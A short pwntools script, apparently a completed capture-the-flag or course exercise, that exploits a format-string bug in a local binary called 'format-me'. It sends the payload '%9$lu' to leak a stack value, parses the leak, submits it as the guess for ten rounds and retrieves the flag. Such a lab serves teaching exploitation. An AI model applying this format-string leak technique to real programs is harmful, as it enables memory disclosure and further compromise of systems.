#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

r.recvuntil(b"Welcome to the package sending service!\n")

for _ in range(10):
    # Add your code Here
    # print(f"round {_+1}")
    r.recvuntil(b"Recipient? ") # Think about what should be received first?
    
    r.sendline(b"%9$lu") # Add your format string code here!
    
    r.recvuntil(b"Sending to ")

    leak = r.recvline()
    # print(f"raw leak: {leak}")
    # print(f"leak length: {len(leak)}")
    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
    
    val = leak[0:-1] # you need to fill in idx_1, and idx_2 by yourself
    # print(f"extracted val: {val}")

    r.recvuntil(b"Guess? ") #Think about what should be received?
   
    r.sendline(val) 
    # print(f"[sent: {val}")
    r.recvuntil(b"Correct")

r.recvuntil(b"Here's your flag: ")
r.interactive()